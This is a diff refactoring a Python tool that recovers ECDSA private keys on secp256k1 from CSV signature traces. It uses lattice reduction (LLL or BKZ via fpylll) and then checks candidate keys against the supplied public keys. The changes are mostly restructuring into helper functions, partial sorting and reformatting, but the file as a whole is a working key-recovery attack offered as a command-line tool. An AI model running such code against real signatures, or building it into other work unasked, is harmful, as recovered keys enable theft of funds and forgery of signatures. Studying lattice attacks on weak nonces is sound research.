@@ -1,14 +1,14 @@
 #!/usr/bin/env python
-# Author: Dario Clavijo (2020) 
-# MIT License 
+# Author: Dario Clavijo (2020)
+# MIT License
 
 import sys
 import argparse
 import mmap
+import heapq
 import gmpy2
 from fpylll import IntegerMatrix, LLL, BKZ
 from ecdsa import SigningKey, SECP256k1
-from ecdsa.ecdsa import int_to_string
 
 DEFAULT_ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
 
@@ -29,6 +29,7 @@ def normalize_pubhex(s: str) -> str:
 
 def load_csv(filename, limit=None, mmap_flag=False):
     msgs, sigs, pubs = [], [], []
+
     def parse_pub(p):
         return normalize_pubhex(p)
 
@@ -39,10 +40,10 @@ def load_csv(filename, limit=None, mmap_flag=False):
             for n, line in enumerate(lines):
                 if limit is not None and n >= limit:
                     break
-                l = line.decode("utf-8").rstrip().split(",")
-                if len(l) < 5:
+                parts = line.decode("utf-8").rstrip().split(",")
+                if len(parts) < 5:
                     continue
-                tx, R, S, Z, pub = l[:5]
+                tx, R, S, Z, pub = parts[:5]
                 msgs.append(int(Z, 16))
                 sigs.append((int(R, 16), int(S, 16)))
                 pubs.append(parse_pub(pub))
@@ -127,11 +128,64 @@ def point_bytes_from_vk(vk):
     return uncompressed.lower(), compressed.lower()
 
 
-def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20, max_candidates=1000):
+def _compute_row_norms(matrix, m, max_rows):
+    """Compute norms for matrix rows, returning up to max_rows smallest.
+
+    Args:
+        matrix: The reduced lattice matrix
+        m: Number of columns to include in norm computation
+        max_rows: Maximum number of rows to return
+
+    Returns:
+        List of (norm, row_index) tuples, sorted by norm (smallest first).
+        Returns min(matrix.nrows, max_rows) items.
+
+    Uses heapq.nsmallest for efficient partial sorting when only a subset
+    of rows is needed. Falls back to full sort when all rows are needed.
+    """
+    norms_generator = (
+        (sum(float(matrix[ridx, j]) ** 2 for j in range(m)), ridx)
+        for ridx in range(matrix.nrows)
+    )
+
+    if matrix.nrows <= max_rows:
+        # Need all rows (fewer than max_rows exist) - full sort is fine
+        return sorted(norms_generator)
+    else:
+        # Need only top max_rows out of many - heapq is more efficient
+        return heapq.nsmallest(max_rows, norms_generator)
+
+
+def _extract_candidate_from_row(row_val, b, cd, ab_list, order):
+    """Extract private key candidates from a single row value."""
+    candidates = []
+    base = (cd - (b * row_val)) % order
+
+    if ab_list is None:
+        candidate = base % order
+        if 1 <= candidate < order:
+            candidates.append(candidate)
+    else:
+        for ab in ab_list:
+            if ab:
+                try:
+                    inv = modular_inv(ab, order)
+                    candidate = (base * inv) % order
+                    if 1 <= candidate < order:
+                        candidates.append(candidate)
+                except Exception:
+                    pass
+    return candidates
+
+
+def privkeys_from_reduced_matrix(
+    msgs, sigs, pubs, matrix, order, max_rows=20, max_candidates=1000
+):
     keys = set()
     m = len(msgs)
     msgn, rn, sn = msgs[-1], sigs[-1][0], sigs[-1][1]
 
+    # Precompute parameters for each signature
     params = []
     for i in range(m):
         a = (rn * sigs[i][1]) % order
@@ -142,76 +196,74 @@ def privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, order, max_rows=20, m
         ab_list = None if a == b else [((a - b) % order), ((b - a) % order)]
         params.append((b, cd, ab_list))
 
-    # compute row norms (only first m columns contribute to norm in our design)
-    row_norms = []
-    for ridx in range(matrix.nrows):
-        # norm over first m columns
-        norm2 = 0.0
-        for j in range(m):
-            v = float(matrix[ridx, j])
-            norm2 += v * v
-        row_norms.append((norm2, ridx))
-    row_norms.sort()
+    # Get sorted row indices by norm
+    row_norms = _compute_row_norms(matrix, m, max_rows)
 
-    checked = 0
-    for _, ridx in row_norms[:max_rows]:
-        if checked >= max_candidates:
+    # Extract candidates from best rows
+    for _, ridx in row_norms:
+        if len(keys) >= max_candidates:
             break
         row = [int(matrix[ridx, j]) for j in range(m)]
         for i, (b, cd, ab_list) in enumerate(params):
-            base = (cd - (b * row[i])) % order
-            if ab_list is None:
-                # direct candidate
-                candidate = base % order
-                if 1 <= candidate < order:
-                    keys.add(candidate)
-            else:
-                for ab in ab_list:
-                    if ab:
-                        try:
-                            inv = modular_inv(ab, order)
-                        except Exception:
-                            continue
-                        candidate = (base * inv) % order
-                        if 1 <= candidate < order:
-                            keys.add(candidate)
-        checked = len(keys)
-        if checked >= max_candidates:
-            break
+            candidates = _extract_candidate_from_row(row[i], b, cd, ab_list, order)
+            keys.update(candidates)
+            if len(keys) >= max_candidates:
+                break
 
     return list(keys)
 
 
-def derived_pubhexes_for_candidates(candidates):
-    """Given a list of private integer candidates, derive both compressed and uncompressed pub hexes."""
-    mapping = {}
-    for priv in candidates:
-        try:
-            sk = SigningKey.from_secret_exponent(priv, curve=SECP256k1)
-            vk = sk.get_verifying_key()
-            uncmp, cmpd = point_bytes_from_vk(vk)
-            mapping[priv] = (uncmp, cmpd)
-        except Exception:
-            # skip invalid privs
-            continue
-    return mapping
+def _try_derive_pubkey(priv):
+    """Attempt to derive public key from private key."""
+    try:
+        sk = SigningKey.from_secret_exponent(priv, curve=SECP256k1)
+        vk = sk.get_verifying_key()
+        return point_bytes_from_vk(vk)
+    except Exception:
+        return None, None
+
+
+def _verify_candidates(keys, pubset, find_all=False):
+    """Verify candidate private keys against known public keys.
+
+    Args:
+        keys: List of candidate private keys to verify
+        pubset: Set of known public keys (hex strings)
+        find_all: If True, find all matching keys. If False, stop after
+                  first match (optimization for typical use case)
+
+    Returns:
+        List of tuples (priv, uncompressed_pub, compressed_pub)
+    """
+    verified = []
+    for priv in keys:
+        uncmp, cmpd = _try_derive_pubkey(priv)
+        if uncmp and (uncmp in pubset or cmpd in pubset):
+            verified.append((priv, uncmp, cmpd))
+            if not find_all:
+                break  # Early exit optimization after first match
+    return verified
 
 
 def display_keys(keys, pubkeys, show_all=False):
+    """Display verified private keys or all candidates.
+
+    Args:
+        keys: List of candidate private keys
+        pubkeys: List of known public keys for verification
+        show_all: If True, show all candidates when none verify. Also finds
+                  all matching keys instead of stopping at first match.
+    """
     pubset = set(normalize_pubhex(p) for p in pubkeys if p)
     if not pubset:
         sys.stderr.write("[!] Warning: no pubkeys given for verification.\n")
 
-    # batch derive pubkeys
-    mapping = derived_pubhexes_for_candidates(keys)
     verified = []
-    for priv, (uncmp, cmpd) in mapping.items():
-        if uncmp in pubset or cmpd in pubset:
-            verified.append((priv, uncmp, cmpd))
+    if pubset:
+        verified = _verify_candidates(keys, pubset, find_all=show_all)
 
     if not verified:
         if show_all:
-            # show all candidates in hex
             print("Recovered candidates (not verified):")
             for k in keys:
                 print(f"{k:064x}")
@@ -227,30 +279,83 @@ def display_keys(keys, pubkeys, show_all=False):
 
 
 def main():
-    parser = argparse.ArgumentParser(description="ECDSA private key recovery using lattice reduction (fpylll)")
+    parser = argparse.ArgumentParser(
+        description="ECDSA private key recovery using lattice reduction"
+    )
     parser.add_argument("filename", help="CSV file containing ECDSA traces")
     parser.add_argument("B", type=int, help="log2 bound parameter B")
-    parser.add_argument("limit", type=int, nargs="?", default=None, help="Limit number of signatures to process (optional)")
-    parser.add_argument("--order", type=int, default=DEFAULT_ORDER, help="Curve order (default: secp256k1)")
-    parser.add_argument("--reduction", choices=["LLL", "BKZ"], default="LLL", help="Lattice reduction algorithm")
-    parser.add_argument("--mmap", action="store_true", help="Enable mmap for fast CSV access")
-    parser.add_argument("--integer_mode", action="store_true", help="Scale matrix to ensure integer values")
-    parser.add_argument("--max_rows", type=int, default=20, help="Max number of reduced rows to inspect")
-    parser.add_argument("--max_candidates", type=int, default=1000, help="Stop after this many candidates are gathered")
-    parser.add_argument("--show_all", action="store_true", help="Show all recovered candidates even if not verified")
+    parser.add_argument(
+        "limit",
+        type=int,
+        nargs="?",
+        default=None,
+        help="Limit number of signatures to process (optional)",
+    )
+    parser.add_argument(
+        "--order",
+        type=int,
+        default=DEFAULT_ORDER,
+        help="Curve order (default: secp256k1)",
+    )
+    parser.add_argument(
+        "--reduction",
+        choices=["LLL", "BKZ"],
+        default="LLL",
+        help="Lattice reduction algorithm",
+    )
+    parser.add_argument(
+        "--mmap", action="store_true", help="Enable mmap for fast CSV access"
+    )
+    parser.add_argument(
+        "--integer_mode",
+        action="store_true",
+        help="Scale matrix to ensure integer values",
+    )
+    parser.add_argument(
+        "--max_rows",
+        type=int,
+        default=20,
+        help="Max number of reduced rows to inspect",
+    )
+    parser.add_argument(
+        "--max_candidates",
+        type=int,
+        default=1000,
+        help="Stop after this many candidates are gathered",
+    )
+    parser.add_argument(
+        "--show_all",
+        action="store_true",
+        help="Show all recovered candidates even if not verified",
+    )
     args = parser.parse_args()
 
-    msgs, sigs, pubs = load_csv(args.filename, limit=args.limit, mmap_flag=args.mmap)
+    msgs, sigs, pubs = load_csv(
+        args.filename, limit=args.limit, mmap_flag=args.mmap
+    )
     sys.stderr.write(f"Using: {len(msgs)} sigs...\n")
     if len(msgs) < 2:
-        sys.stderr.write("[!] Warning: fewer than 2 signatures - results may be meaningless.\n")
+        sys.stderr.write(
+            "[!] Warning: fewer than 2 signatures - "
+            "results may be meaningless.\n"
+        )
 
-    matrix = make_matrix_fpylll(msgs, sigs, args.B, args.order, integer_mode=args.integer_mode)
+    matrix = make_matrix_fpylll(
+        msgs, sigs, args.B, args.order, integer_mode=args.integer_mode
+    )
     sys.stderr.write("Matrix constructed, starting reduction...\n")
     matrix = reduce_matrix(matrix, algorithm=args.reduction)
     sys.stderr.write("Reduction complete, extracting candidates...\n")
 
-    keys = privkeys_from_reduced_matrix(msgs, sigs, pubs, matrix, args.order, max_rows=args.max_rows, max_candidates=args.max_candidates)
+    keys = privkeys_from_reduced_matrix(
+        msgs,
+        sigs,
+        pubs,
+        matrix,
+        args.order,
+        max_rows=args.max_rows,
+        max_candidates=args.max_candidates,
+    )
     sys.stderr.write(f"Candidates found: {len(keys)}\n")
 
     display_keys(keys, pubs, show_all=args.show_all)
